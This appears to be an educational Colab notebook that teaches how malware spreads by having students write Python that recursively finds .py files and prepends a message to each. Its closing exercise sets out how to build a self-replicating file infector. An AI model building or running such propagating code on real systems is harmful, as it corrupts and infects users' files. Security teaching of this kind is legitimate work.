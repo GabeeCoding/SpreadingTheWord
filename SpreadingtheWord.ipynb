{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/carlosfmorenog/SpreadingTheWord/blob/main/SpreadingtheWord.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "5DEA1PLZ9l2s"
      },
      "source": [
        "# Spreading the Word in Python"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "jnjXZwnC9l2v"
      },
      "source": [
        "In this activity, we will learn how to create a very basic message using Python. Moreover, you will learn how this message can be propagated in a virtual environment."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "n6o8Hm0S9l2x"
      },
      "source": [
        "## Basic Requirements"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "V5wdfk4f9l2z"
      },
      "source": [
        "For this activity, you are required to install the `os` python module (using `pip install os`) in case you don't already have it. Also, you need the following files:\n",
        "* `file1.py`: This script simply prints \"Hello world!\". If you are working locally in your computer, save it in the same directory that you are using for this notebook. Otherwise, we will load it directly from GitHub.\n",
        "* `file2.py`: This code cracks a hashed password using a brute force approach. If you are working locally in your computer, save it in a subdirectory from the path where this notebook is saved (you can use any name for the subdirectory). Otherwise, we will load it directly in a subdirectory called `Data` via GitHub.\n"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Run the following cell to load the two `.py` files from my GitHub website"
      ],
      "metadata": {
        "id": "mTlDe17MkdRU"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!git clone https://github.com/carlosfmorenog/SpreadingTheWord"
      ],
      "metadata": {
        "id": "1-HWnGxBkoPZ",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "402c8706-6bca-478b-87d9-7f6d8a3f6bb1"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Cloning into 'SpreadingTheWord'...\n",
            "remote: Enumerating objects: 8, done.\u001b[K\n",
            "remote: Counting objects: 100% (8/8), done.\u001b[K\n",
            "remote: Compressing objects: 100% (4/4), done.\u001b[K\n",
            "remote: Total 8 (delta 0), reused 5 (delta 0), pack-reused 0\u001b[K\n",
            "Receiving objects: 100% (8/8), done.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "l1CnWRKR9l2z"
      },
      "source": [
        "## Implementing from Scratch"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "m-mQSB0E9l20"
      },
      "source": [
        "Spreading messages can be used for good or bad. In the case of malware, it inserts inself into a system (usually in a secert way) with the intent of compromising a program or the whole system.\n",
        "\n",
        "In this laboratory, we will design a simple code in Python which will replicate itself into other `.py` files."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "UhpREn3Y9l22"
      },
      "source": [
        "### Search for .py files"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "k6VaPD3j9l23"
      },
      "source": [
        "**STEP 1**: We will implement a function called `search` which will be in charge of exploring a directory and its subdirectories to find all `.py` files. To do so, first you need to extract the list of files and subdirectories that are located in the current directory. To do so, you can use the command `filelist = os.listdir(path)`, where `path` is the current directory.\n",
        "\n",
        "**HINT**: If you got the data from GitHub, you can use the command `os.path.abspath(\"SpreadingTheWord\")`. Otherwise, you should use `os.path.abspath(\"\")`"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "J4kXUtg89l23",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "056844d7-7532-4ade-af22-92c1c99899e3"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['Data', '.git', 'file1.py', 'README.md']"
            ]
          },
          "metadata": {},
          "execution_count": 3
        }
      ],
      "source": [
        "## Use this cell to\n",
        "## 1) import the os module,\n",
        "## 2) find the list of files/directories in the current directory and save them in a variable \"filelist\" and,\n",
        "## 3) print filelist.\n",
        "import os\n",
        "filelist = os.listdir(os.path.abspath(\"SpreadingTheWord\"))\n",
        "filelist"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "cupAdHhT9l24"
      },
      "source": [
        "If you are exploring the `GitHub` data, you should see a list of the files and folders cloned from the repo, including `file1.py`, `.git`, `README.md` and `Data`, which contains `file2.py`. You will even see this Jupyter Notebook but not the original one, but the cloned copy!\n",
        "\n",
        "If you are working in your computer, you will see similar things, and possibly a folder called `.ipynb_checkpoints`."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "korIrdk39l24"
      },
      "source": [
        "**STEP 2**: Using a `for` loop, iterate `filelist` to see which files have the `.py` extension.\n",
        "\n",
        "**HINT**: When you iterate `filelist` you are examining strings, therefore you can take advantage of the string data structure and check if the last 3 positins of any given string are the characters `.py`. Once you have found a string that ends in `.py`, remember to **add** the path of the current directory to the name of the file separated by the \"/\" character or the \"_\\_\\\" characters before appending to the list."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "Ou9vi94A9l25",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "3c76cf41-9e1e-4032-f814-1f1f6a311b4c"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['/content/file1.py']"
            ]
          },
          "metadata": {},
          "execution_count": 4
        }
      ],
      "source": [
        "## Use this cell to iterate filelist and find the .py files. If one is found, append it to a \"filestoinfect\" list.\n",
        "## In the end, print \"filestoinfect\".\n",
        "filestoinfect = []\n",
        "for name in filelist:\n",
        "    if name[-3:] == \".py\":\n",
        "        filestoinfect.append(os.path.abspath(\"\")+\"/\"+name)\n",
        "filestoinfect"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "kdXhKjfJ9l26"
      },
      "source": [
        "If done have done this correctly, you should be able to append the malware and `file1.py` but **NOT** `file2.py`. This is due to the fact that we have only explored the current directory, but not its subdirectories!"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "nW5-t23B9l26"
      },
      "source": [
        "**STEP 3**: Using a for loop, iterate once again `filelist` to **print** the names of the subdirectories.\n",
        "\n",
        "**HINT**: You can use the command `os.path.isdir(\"SpreadingTheWord/\"+name)` to know if a certain name is in the filelist is a directory or not."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "QeWZThxb9l27",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "f30e8f07-b7b2-4977-a00f-041b64f699c9"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "SpreadingTheWord/Data\n",
            "SpreadingTheWord/.git\n"
          ]
        }
      ],
      "source": [
        "## Use this cell to iterate filelist and print the subdirectories.\n",
        "for name in filelist:\n",
        "  if os.path.isdir(\"SpreadingTheWord/\"+name):\n",
        "        print(\"SpreadingTheWord/\"+name)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Hy3uajss9l27"
      },
      "source": [
        "If you have done this step correctly, then you will print the subdirectories of your current path, including `Data`, the one where `file2.py` is stored. If you are doing this excercise online, a folder called `.git` will appear, and if you are working locally in your computer, you will see a folder called `.ipynb_checkpoints`, which is autogenerated by Jupyter Notebook as an autosave."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Khgb_7R_9l28"
      },
      "source": [
        "**STEP 4**: Now that we have all of these elements, create a `search()` function which will take a `path` as an input and will return the list of files to infect."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "UTdVdqys9l28",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "1fbc1eea-206a-461c-cec3-eed6b38f37e5"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "List of files to spread message into:\n",
            "\n",
            "['/content/SpreadingTheWord/Data/file2.py', '/content/SpreadingTheWord/file1.py']\n"
          ]
        }
      ],
      "source": [
        "## Use this cell to implement the search function.\n",
        "import os\n",
        "def search(path):\n",
        "    # 1. Define \"filestospreadmessage\" as an empty list.\n",
        "    filestospreadmessage = []\n",
        "    # 2. Find the list of files/irectories in the specified path and save them in variable \"filelist\".\n",
        "    filelist = os.listdir(path)\n",
        "    # 3. for name in filelist:\n",
        "    for name in filelist:\n",
        "        # 3.a. Check if name is a subdirectory. If true, call again the search function in this subdirectory.\n",
        "        # HINT: To avoid reset filestospreadmessage when you call the function, use filestospreadmessage.extend(search(path+\"/\"+name))\n",
        "        if os.path.isdir(\"SpreadingTheWord/\"+name):\n",
        "            filestospreadmessage.extend(search(path+\"/\"+name))\n",
        "        # 3.b. Else, if it is a .py file, append it to \"filestospreadmessage\"\n",
        "        elif name[-3:] == \".py\":\n",
        "            filestospreadmessage.append(path+\"/\"+name)\n",
        "    return filestospreadmessage\n",
        "\n",
        "## Use the search function in the current directory\n",
        "filestospreadmessage = search(os.path.abspath(\"SpreadingTheWord\"))\n",
        "print(\"List of files to spread message into:\\n\")\n",
        "print(filestospreadmessage)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "7eVxWJ-p9l29"
      },
      "source": [
        "If the function was implemented correctly, then you will be able to print the malware and the two victim files."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "3XWskUbS9l29"
      },
      "source": [
        "### Spread the message into .py files"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "collapsed": true,
        "id": "-Pfy30cz9l29"
      },
      "source": [
        "To insert the message into the files, you have to loop the `filestospreadmessage` list and get each of the files. This consists in two steps:\n",
        "1. Loading the file to be infected and storing the instructions of the `.py` file into a `temp` variable.\n",
        "2. Adding the message to the temp and rewritting the loaded file."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "collapsed": true,
        "id": "ComZo1Ee9l29",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "a78c2e60-08ff-4585-e257-d43bad7a8061"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "File file2.py has the message!\n",
            "File file1.py has the message!\n"
          ]
        }
      ],
      "source": [
        "def spread(filestospreadmessage):\n",
        "    message = '# This file is has a message inside!\\n'\n",
        "    for name in filestospreadmessage:\n",
        "        # 1. Open the file, load the instructions in a temp variable and close the file.\n",
        "        f = open(name)\n",
        "        temp = f.read()\n",
        "        f.close()\n",
        "        # 2. Open the the file in \"write mode\" and write the malware and close the file.\n",
        "        f = open(name,'w')\n",
        "        f.write(message+temp)\n",
        "        f.close()\n",
        "        print(\"File \"+name.split(\"/\")[-1]+\" has the message!\")\n",
        "    return\n",
        "\n",
        "spread(filestospreadmessage)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "aDt1D6xE9l2-"
      },
      "source": [
        "Now, inspect the victim files and see if the first line of the file has the message.\n",
        "\n",
        "The first line of the code should be: `# This file is has a message inside!`"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Your Turn"
      ],
      "metadata": {
        "id": "DW6-yt92UNAq"
      }
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Z_eoorC_9l2-"
      },
      "source": [
        "Create a Python file called `malware.py` and paste the `search()` and the `spread()` functions. Apply the following changes to the functions:\n",
        "\n",
        "* `search()`: Implement a mechanism that **EXCLUDES** `malware.py` from the `filestospreadmessage` list the file that is running the malware (**HINT**: Use some type of marker to avoid spreading the message to malware.py itself!).\n",
        "* `spread()`: Spread the message to the files using **the code contained in `malware.py`** instead of the one line comment, so that when an unsuspected user runs a victim code, the malware keeps propagating!\n",
        "* ADDITIONAL CHANGES: Print a message (for instance, \"THE MALWARE IS OUT! X FILES HAVE BEEN INFECTED!\") where X is the number of files that have been infected by the malware. (**HINT**: Use a counter inside the `spread()` function).\n",
        "\n",
        "**NOTE**: Make sure that the very last line of `malware.py` is empty or a `'\\n'` string, so that when the code is copied into the victims, it doesn't overlap the first instruction of the victim."
      ]
    }
  ],
  "metadata": {
    "kernelspec": {
      "display_name": "Python 3",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.6.0"
    },
    "colab": {
      "provenance": [],
      "toc_visible": true,
      "include_colab_link": true
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}